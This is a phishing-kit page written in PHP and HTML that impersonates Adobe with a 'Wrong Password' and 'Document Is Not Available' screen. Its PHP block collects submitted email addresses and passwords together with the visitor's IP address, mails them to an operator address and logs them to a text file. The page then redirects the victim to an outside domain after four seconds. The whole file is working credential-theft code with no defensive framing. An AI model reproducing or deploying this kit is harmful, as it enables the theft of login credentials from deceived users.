<?php
 
if (isset($_POST['email'])) {
    $msg='';
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $today = date("d-m-Y");
    $my_email = 'your email here';
 
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $title = 'Log' | '.$today';
    $msg .= 'email: '.$email.''."\n";
    $msg .= 'pass '.$pass."\n";
    $msg .= 'IP: '.$ip."\n";
    mail($my_email, $title, $msg);
   
    $line_ok = $email.'|'.$pass.'|'.$ip;
    $file_log = fopen('log_abc.txt', 'a+');
    fwrite($file_log, $msg."</br>");
    fclose($file_log);
   
 
}
 
?>

<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" href="../../../acrobat.adobe.com/favicon-16x16.png.htm">
<script type="text/javascript">
<!--
function delayer(){
window.location='http://download9.cf/hch/suy/adobe/';
}
//-->
</script>
<meta charset="utf-8">
<title>Wrong Password</title>
<style type="text/css">

html { 
  background: #; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.transparent {
	zoom: 1;
	filter: alpha(opacity=90);
	opacity: 0.9;
}

.inp{

	border: 1px solid #EAEAEA;
	-moz-border-radius: 3px;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	-webkit-box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
	-moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
	box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
}
.btn {
  background: #8c1ee6;
  background-image: -webkit-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: -moz-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: -ms-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: -o-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: linear-gradient(to bottom, #8c1ee6, #6b14b3);
  -webkit-border-radius: 10;
  -moz-border-radius: 10;
  border-radius: 10px;
  font-family: Arial;
  color: #ffffff;
  font-size: 20px;
  padding: 13px 15px 12px 16px;
  text-decoration: none;
}

.btn:hover {
  background: #a039f5;
  background-image: -webkit-linear-gradient(top, #a039f5, #963de0);
  background-image: -moz-linear-gradient(top, #a039f5, #963de0);
  background-image: -ms-linear-gradient(top, #a039f5, #963de0);
  background-image: -o-linear-gradient(top, #a039f5, #963de0);
  background-image: linear-gradient(to bottom, #a039f5, #963de0);
  text-decoration: none;
}
#errfn{
  color:red;
}
#errfnn{
  color:red;
}

.cover{
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    background-color: rgba(0,0,0,0.5);
    z-index: 10;
}

</style>

</head>

<body style="background:#fff; font-family:helvetica, verdana, tahoma, arial;" onload="setTimeout('delayer()', 4000)">
<div style="width:700px; margin:0 auto;">
<img src="http://ansgaronts.win/OibGCRFQ17700/index_files/pdfIcon.png" style="margin:0 0 0 160px;" width="197px" height="192px"><br><h1 style="color:#696767; text-shadow: 0px 1px 1px #4d4d4d;">Document Is Not Available, Try again later...</h1>


      
      <script type="text/javascript">
// <![CDATA[
var excelValidator = new Validator("Adobe");
excelValidator.addValidation("Email",{required:true,message:"Please fill in Email"} );
excelValidator.addValidation("Email",{email:true,message:"The input for Email should be a valid email value"} );
excelValidator.addValidation("Password",{required:true,message:"Please fill in Password"} );

      </script>
   


</div></body></html>



